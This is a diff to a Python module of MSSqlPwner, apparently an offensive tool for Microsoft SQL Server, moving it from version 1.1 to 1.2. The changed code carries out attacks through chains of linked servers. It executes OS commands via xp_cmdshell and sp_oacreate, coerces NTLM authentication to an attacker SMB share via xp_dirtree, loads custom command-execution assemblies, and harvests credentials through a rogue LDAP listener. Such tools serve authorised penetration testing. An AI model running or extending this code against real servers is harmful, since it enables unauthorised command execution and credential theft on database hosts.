@@ -1,7 +1,7 @@
 ########################################################
 __author__ = ['Nimrod Levy']
 __license__ = 'GPL v3'
-__version__ = 'v1.1'
+__version__ = 'v1.2'
 __email__ = ['El3ct71k@gmail.com']
 
 ########################################################
@@ -9,7 +9,6 @@ __email__ = ['El3ct71k@gmail.com']
 import os
 import sys
 import json
-import time
 import logging
 import readline
 import utilities
@@ -24,11 +23,12 @@ class Playbooks(Operations):
     def __init__(self, server_address, user_name, args_options):
         super().__init__(server_address, user_name, args_options)
 
-    def disconnect(self) -> None:
+    def disconnect(self, rev2self: bool = True) -> None:
         """
         This function is responsible to revert to SELF and disconnect from the server.
         """
-        self.call_rev2self()
+        if rev2self:
+            self.call_rev2self()
         super().disconnect()
 
     def enumerate(self) -> bool:
@@ -41,19 +41,17 @@ class Playbooks(Operations):
                                                              ["y", "n"], 'y'):
                     self.state = json.load(open(self.state_filename))
                 else:
-                    if not self.retrieve_server_information():
-                        return False
-                    self.retrieve_links()
+                    chain_id = self.retrieve_server_information(None, None)
+                    self.retrieve_links(chain_id)
         else:
-            if not self.retrieve_server_information():
-                return False
-            self.retrieve_links()
+            chain_id = self.retrieve_server_information(None, None)
+            self.retrieve_links(chain_id)
 
         utilities.store_state(self.state_filename, self.state)
         utilities.print_state(self.state)
         return True
 
-    def execute_command_by_procedure(self, linked_server: str,
+    def execute_command_by_procedure(self, chain_id: str,
                                      command_execution_method: Literal['xp_cmdshell', 'sp_oacreate'], command: str):
         """
         This function is responsible to execute a command on the server using existing procedures.
@@ -63,10 +61,9 @@ class Playbooks(Operations):
             LOG.error("Command is required for exec module")
             return False
 
-        return self.procedure_chain_builder(self.execute_procedure, [command_execution_method, command],
-                                            linked_server=linked_server)
+        return self.execute_procedure(chain_id, command_execution_method, command)
 
-    def ntlm_relay(self, linked_server: str, relay_method: Literal['xp_dirtree', 'xp_subdirs', 'xp_fileexist'],
+    def ntlm_relay(self, chain_id: str, relay_method: Literal['xp_dirtree', 'xp_subdirs', 'xp_fileexist'],
                    smb_server: str):
         """
         This function is responsible to execute a ntlm-relay attack on the server using existing procedures.
@@ -77,9 +74,9 @@ class Playbooks(Operations):
             return False
 
         share = fr"\\{smb_server}\{utilities.generate_string()}\{utilities.generate_string()}"
-        return self.procedure_chain_builder(self.execute_procedure, [relay_method, share], linked_server=linked_server)
+        return self.execute_procedure(chain_id, relay_method, share)
 
-    def execute_direct_query(self, link_server: str, method: Literal['OpenQuery', 'exec_at'], query: str):
+    def execute_direct_query(self, chain_id: str, method: Literal['OpenQuery', 'exec_at'], query: str):
         """
         This function is responsible to execute a query on the server.
         e.g. OpenQuery, exec_at
@@ -87,78 +84,79 @@ class Playbooks(Operations):
         if not query:
             LOG.error("Query is required for direct_query module")
             return False
-        return self.procedure_chain_builder(self.direct_query, [query], linked_server=link_server, method=method)
+        return self.direct_query(chain_id, query, method)
 
-    def retrieve_password(self, linked_server: str, port: int, adsi_provider: str,
+    def retrieve_password(self, chain_id: str, port: int, adsi_provider: str,
                           arch: Literal['autodetect', 'x86', 'x64'], target: str) -> bool:
         """
         This function is responsible to retrieve passwords from the server using custom assemblies.
         """
         domain, username, password, address = parse_target(target)
-        for server_info in self.filter_server_by_chain_str(linked_server):
-            arch = self.detect_architecture(server_info['chain_str'], arch)
-            if not arch:
-                LOG.error(f"Failed to detect the architecture of {linked_server}")
-                return False
+        server_info = self.state['servers_info'][chain_id]
+        if not server_info['adsi_providers']:
+            LOG.error("No ADSI providers found")
+            return True
 
-            ldap_filename = "LdapServer-x64.dll" if arch == 'x64' else "LdapServer-x86.dll"
-            ldap_assembly = os.path.join(self.custom_asm_directory, ldap_filename)
-            if not server_info['adsi_providers']:
+        arch = self.detect_architecture(chain_id, arch)
+        chain_str = self.generate_chain_str(chain_id)
+        if not arch:
+            LOG.error(f"Failed to detect the architecture of {chain_str}")
+            return False
+
+        ldap_filename = "LdapServer-x64.dll" if arch == 'x64' else "LdapServer-x86.dll"
+        ldap_assembly = os.path.join(self.custom_asm_directory, ldap_filename)
+        if not server_info['adsi_providers']:
+            return False
+
+        if adsi_provider and adsi_provider not in server_info['adsi_providers']:
+            LOG.error(f"The {chain_str} server does not support the {adsi_provider} provider")
+            return False
+        for discovered_provider in server_info['adsi_providers']:
+            if adsi_provider and adsi_provider != discovered_provider:
                 continue
 
-            if adsi_provider and adsi_provider not in server_info['adsi_providers']:
-                LOG.error(f"The {linked_server} server does not support the {adsi_provider} provider")
-                return False
-
-            for discovered_provider in server_info['adsi_providers']:
-                if adsi_provider and adsi_provider != discovered_provider:
+            if not adsi_provider:
+                if (not self.auto_yes) and not utilities.receive_answer(
+                        f"Do you want to retrieve passwords from {discovered_provider} provider?",
+                        ["y", "n"], 'y'):
                     continue
-                if not adsi_provider:
-                    if (not self.auto_yes) and not utilities.receive_answer(
-                            f"Do you want to retrieve passwords from {discovered_provider} provider?",
-                            ["y", "n"], 'y'):
-                        continue
+            listener = self.execute_custom_assembly_function(chain_id, ldap_assembly, "listen", "LdapSrv",
+                                                             "ldapAssembly", str(port), wait=False)
 
-                if self.procedure_chain_builder(self.execute_custom_assembly_function,
-                                                [ldap_assembly, "listen", "LdapSrv", "ldapAssembly",
-                                                 str(port)], linked_server=linked_server):
-                    time.sleep(1)
-                    client = Playbooks(self.server_address, self.username, self.options)
-                    client.options.debug = False
-                    LOG.setLevel(logging.ERROR)
-                    client.connect(username, password, domain)
-                    client.state = self.state
-                    LOG.setLevel(logging.DEBUG if self.debug else logging.INFO)
-                    client.options.debug = self.options.debug
-                    chained_query = self.build_query_chain(server_info['chain_tree'] + [discovered_provider],
-                                                           Queries.LDAP_QUERY.format(port=port), "OpenQuery")
+            if listener and listener['is_success']:
+                client = Playbooks(self.server_address, self.username, self.options)
+                client.options.debug = False
+                LOG.setLevel(logging.ERROR)
+                client.connect(username, password, domain)
+                client.state = self.state
+                LOG.setLevel(logging.DEBUG if self.debug else logging.INFO)
+                client.options.debug = self.options.debug
+                client.build_chain(chain_id, Queries.LDAP_QUERY.format(port=port), method="OpenQuery",
+                                   adsi_provider=discovered_provider)
 
-                    client.custom_sql_query(chained_query, wait=True)
-                    LOG.info("Sleeping for 5 seconds..")
-                    time.sleep(5)
-                    client.disconnect()
-                    tds_data = self.ms_sql.recvTDS()
-                    self.ms_sql.replies = self.ms_sql.parseReply(tds_data['Data'], False)
-
-                    results = self.parse_logs()
-                    if results and results['is_success']:
-                        LOG.info(f"Successfully retrieved password from {server_info['chain_str']}")
-                        for credentials in results['results'][0].values():
-                            LOG.info(f"[+] Discovered credentials: {credentials}")
-                    else:
-                        LOG.warning(f"Failed to retrieve password from {server_info['chain_str']}")
-        return True
+                client.disconnect(rev2self=False)
+                results = listener['thread'].join()
+                if results and results['is_success']:
+                    LOG.info(f"Successfully retrieved password from {chain_str}")
+                    for credentials in results['results'][0].values():
+                        LOG.info(f"[+] Discovered credentials: {credentials}")
+                    return True
+                else:
+                    LOG.warning(f"Failed to retrieve password from {chain_str}")
+        return False
 
     def get_chain_list(self) -> bool:
         """
         This function is responsible to return the chain list.
         """
         LOG.info("Chain list:")
-        for server_info in self.sort_servers_by_chain_id():
-            username = server_info['server_user']
+        for server_info in utilities.sort_by_chain_length([v for k, v in self.state['servers_info'].items()]):
+            chain_id = server_info['chain_id']
+            chain_str = self.generate_chain_str(chain_id)
+            user_name = server_info['server_user']
             db_user = server_info['db_user']
-            chain_str = server_info['chain_str']
-            LOG.info(f"{server_info['chain_id']} - {chain_str} (Server user: {username} | DB User: {db_user})")
+            db_name = server_info['db_name']
+            LOG.info(f"{chain_id} - {chain_str} ({user_name} {db_user}@{db_name})")
         return True
 
     def get_linked_server_list(self) -> bool:
@@ -167,12 +165,13 @@ class Playbooks(Operations):
         """
         LOG.info("Linked_server_list:")
         link_servers = []
-        for server_info in self.sort_servers_by_chain_id():
+        for server_info in utilities.sort_by_chain_length([v for k, v in self.state['servers_info'].items()]):
             link_name = server_info['link_name']
-            if link_name in link_servers:
+            link_host = f"{server_info['hostname']}.{server_info['domain_name']}"
+            if link_host in link_servers:
                 continue
-            link_servers.append(link_name)
-            LOG.info(f"{link_name}")
+            link_servers.append(link_host)
+            LOG.info(f"{link_name} (Hostname: {server_info['hostname']} | Domain: {server_info['domain_name']})")
         return True
 
     def call_rev2self(self) -> bool:
@@ -183,10 +182,11 @@ class Playbooks(Operations):
             LOG.info("Nothing to revert")
             return True
         LOG.info("Reverting to self..")
-        for linked_server, query_list in self.rev2self.items():
+        for chain_id, query_list in self.rev2self.items():
+            chain_str = self.generate_chain_str(chain_id)
             for query in reversed(query_list):
-                self.custom_sql_query(query, linked_server)
-            LOG.info(f"Successfully reverted to self on {linked_server}")
+                self.custom_sql_query(query)
+            LOG.info(f"Successfully reverted to self on {chain_str}")
         self.rev2self.clear()
         return True
 
@@ -194,26 +194,56 @@ class Playbooks(Operations):
         """
         This function is responsible to retrieve the commands that are needed to revert to self.
         """
-        for linked_server, queries in self.rev2self.items():
+        for chain_id, queries in self.rev2self.items():
+            chain_str = self.generate_chain_str(chain_id)
             for query in queries:
-                LOG.info(f"{linked_server}: {query}")
+                LOG.info(f"{chain_str}: {query}")
+        return True
+
+    def get_execution_list(self, chain_id: str, link_name: str):
+        if chain_id:
+            server_list = [{"chain_id": chain_id}]
+        else:
+            server_list = self.filter_server_by_link_name(link_name)
+
+        for server_info in server_list:
+            yield server_info['chain_id']
+
+    def get_adsi_provider_list(self):
+        """
+        This function is responsible to retrieve the ADSI providers.
+        """
+        LOG.info("ADSI Providers:")
+        link_servers = []
+        for server_info in utilities.sort_by_chain_length([v for k, v in self.state['servers_info'].items()]):
+            link_name = server_info['link_name']
+            link_host = f"{server_info['hostname']}.{server_info['domain_name']}"
+            if not server_info['adsi_providers']:
+                continue
+            if link_host in link_servers:
+                continue
+            link_servers.append(link_host)
+            LOG.info(f"{link_name} (Providers: {', '.join(server_info['adsi_providers'])})")
         return True
 
     def interactive_mode(self, options) -> bool:
         chosen_chain_id = options.chain_id
-        chosen_link_server = options.link_server
+        chosen_link_name = options.link_name if options.link_name else self.state['hostname']
         parser, available_modules = utilities.generate_arg_parser()
         available_modules.remove("interactive")
         available_modules += ["help", "exit"]
         while True:
             try:
-                chosen_link_server = chosen_link_server if chosen_link_server else self.state['local_hostname']
-                title = self.get_title(chosen_link_server)
+                chain_id = list(self.get_execution_list(chosen_chain_id, chosen_link_name))[0]
+                title = self.get_title(chain_id)
 
                 args_list = input(f"MSSqlPwner#{title}> ").strip()
-
-                if args_list.split(" ")[0] not in available_modules:
-                    LOG.error(f"Unknown module {args_list.split(' ')[0]}, you can use: {', '.join(available_modules)}")
+                selected_module = args_list.split(' ')[0]
+                if selected_module not in available_modules:
+                    LOG.error(f'Unknown module {selected_module}.')
+                    LOG.info(f"Available modules:")
+                    for available_module in available_modules:
+                        LOG.info(f"\t - {available_module}")
                     continue
                 elif args_list == "exit":
                     break
@@ -223,109 +253,96 @@ class Playbooks(Operations):
                 arguments = utilities.split_exclude_quotes(f'{" ".join(sys.argv[1:]).strip()} {args_list}')
                 arguments.remove("interactive")
                 args = parser.parse_args(arguments)
-                args.chain_id = chosen_chain_id
-                args.link_server = chosen_link_server
                 if args.module == "enumerate":
                     self.enumerate()
                     continue
                 elif args.module == "set-chain":
-                    chosen_link_server = None
-                    self.chain_id = args.chain
-                    if not self.is_valid_chain_id():
-                        LOG.error("Chain id is not valid!")
-                        self.chain_id = None
-                        continue
-                    chosen_chain_id = args.chain
+                    if self.is_valid_chain_id(args.chain):
+                        chosen_chain_id = args.chain
                     continue
+
                 elif args.module == "set-link-server":
-                    chosen_chain_id = None
-                    self.chain_id = None
-                    link_server = args.link.upper()
-                    if not self.is_valid_link_server(link_server):
-                        LOG.error("Linked server is not valid!")
-                        continue
-
-                    chosen_link_server = link_server
+                    if self.is_valid_link_server(args.link):
+                        chosen_link_name = args.link
+                        chosen_chain_id = None
                     continue
 
-                self.execute_module(args)
+                if not self.execute_module(chosen_chain_id, chosen_link_name, args):
+                    break
 
             except KeyboardInterrupt:
                 break
         return True
 
-    def custom_asm(self, linked_server: str, arch: Literal['autodetect', 'x86', 'x64'], procedure_name: str,
+    def custom_asm(self, chain_id: str, arch: Literal['autodetect', 'x86', 'x64'], procedure_name: str,
                    command: str) -> bool:
         if not command:
             LOG.error("Command is required for custom-asm module")
             return False
 
-        arch_name = self.detect_architecture(linked_server, arch)
+        arch_name = self.detect_architecture(chain_id, arch)
         if not arch_name:
-            LOG.error(f"Failed to detect the architecture of {linked_server}")
+            chain_str = self.generate_chain_str(chain_id)
+            LOG.error(f"Failed to detect the architecture of {chain_str}")
             return False
 
         asm_filename = "CmdExec-x64.dll" if arch_name == 'x64' else "CmdExec-x86.dll"
         file_location = os.path.join(self.custom_asm_directory, asm_filename)
-        return self.procedure_chain_builder(self.execute_custom_assembly_procedure,
-                                            [file_location, procedure_name, command, "CalcAsm"],
-                                            linked_server=linked_server)
+        return self.execute_custom_assembly_procedure(chain_id, file_location, procedure_name, command, "CalcAsm")
 
-    def encapsulated_commands(self, chain_str: str, options):
+    def encapsulated_commands(self, chain_id: str, options):
         ret_val = False
-        if options.module == 'exec':
-            ret_val = self.execute_command_by_procedure(chain_str, options.command_execution_method, options.command)
+        try:
+            if options.module == 'exec':
+                ret_val = self.execute_command_by_procedure(chain_id, options.command_execution_method, options.command)
 
-        elif options.module == 'ntlm-relay':
-            ret_val = self.ntlm_relay(chain_str, options.relay_method, options.smb_server)
+            elif options.module == 'ntlm-relay':
+                ret_val = self.ntlm_relay(chain_id, options.relay_method, options.smb_server)
 
-        elif options.module == 'custom-asm':
-            ret_val = self.custom_asm(chain_str, options.arch, options.procedure_name, options.command)
+            elif options.module == 'custom-asm':
+                ret_val = self.custom_asm(chain_id, options.arch, options.procedure_name, options.command)
 
-        elif options.module == 'direct_query':
-            ret_val = self.execute_direct_query(chain_str, options.method, options.query)
+            elif options.module == 'direct_query':
+                ret_val = self.execute_direct_query(chain_id, options.method, options.query)
 
-        elif options.module == 'retrieve-password':
-            ret_val = self.retrieve_password(chain_str, options.listen_port, options.adsi_provider, options.arch,
-                                             options.target)
+            elif options.module == 'retrieve-password':
+                ret_val = self.retrieve_password(chain_id, options.listen_port, options.adsi_provider, options.arch,
+                                                 options.target)
 
-        elif options.module == 'get-chain-list':
-            ret_val = self.get_chain_list()
-        elif options.module == 'get-link-server-list':
-            ret_val = self.get_linked_server_list()
-        elif options.module == 'rev2self':
-            ret_val = self.call_rev2self()
-        elif options.module == 'get-rev2self-queries':
-            ret_val = self.get_rev2self_queries()
-        elif options.module == "interactive":
-            ret_val = self.interactive_mode(options)
+            elif options.module == 'get-chain-list':
+                ret_val = self.get_chain_list()
+            elif options.module == 'get-link-server-list':
+                ret_val = self.get_linked_server_list()
+            elif options.module == 'rev2self':
+                ret_val = self.call_rev2self()
+            elif options.module == 'get-rev2self-queries':
+                ret_val = self.get_rev2self_queries()
+            elif options.module == 'get-adsi-provider-list':
+                ret_val = self.get_adsi_provider_list()
+            elif options.module == "interactive":
+                ret_val = self.interactive_mode(options)
+        except KeyboardInterrupt as e:
+            LOG.error(f"An error occurred: {e}")
         return ret_val
 
-    def execute_module(self, options):
+    def execute_module(self, chain_id, link_name, options):
         """
         This function is responsible to execute the given module.
         """
-
+        link_name = link_name if link_name else self.state['hostname']
         if options.module == "enumerate":
             # It returned without calling since it is already called in the main function.
             return True
 
-        link_server = options.link_server if options.link_server else self.state['local_hostname']
-        if options.chain_id:
-            if not self.is_valid_chain_id():
+        if chain_id:
+            if not self.is_valid_chain_id(chain_id):
                 return False
-            filtered_chains = self.filter_server_by_chain_id(options.chain_id)
 
         else:
-            if not self.is_valid_link_server(link_server):
+            if not self.is_valid_link_server(link_name):
                 return False
-            filtered_chains = self.filter_server_by_link_name(link_server)
-
-        for server_info in filtered_chains:
-            chain_str = server_info['chain_str']
-            if not self.encapsulated_commands(chain_str, options):
-                LOG.error(f"Failed to execute {options.module} module on {chain_str}")
+        for chain_id in self.get_execution_list(chain_id, link_name):
+            if not self.encapsulated_commands(chain_id, options):
                 continue
-            LOG.info(f"Successfully executed {options.module} module on {chain_str}")
             break
         return True
